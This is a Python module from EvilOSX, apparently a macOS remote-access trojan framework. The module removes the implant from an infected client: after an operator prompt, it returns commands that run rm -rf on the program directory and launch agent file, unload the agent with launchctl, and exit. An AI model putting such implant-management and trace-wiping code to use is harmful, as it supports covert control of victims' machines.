class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Removes EvilOSX from the client.",
            "References": []
        }

    def setup(self, module_view, output_view, successful):
        confirm = module_view.prompt("Are you sure you want to remove this client? [Y/n] ").lower()

        if not confirm or confirm == "y":
            successful.put(True)
        else:
            output_view.add("Cancelled", "info")
            successful.put(False)

    def run(self):
        return """\        
        run_command("rm -rf " + get_program_directory())
        run_command("rm -rf " + get_launch_agent_file())
        run_command("launchctl remove " + LAUNCH_AGENT_NAME)
        sys.exit(0)
        """
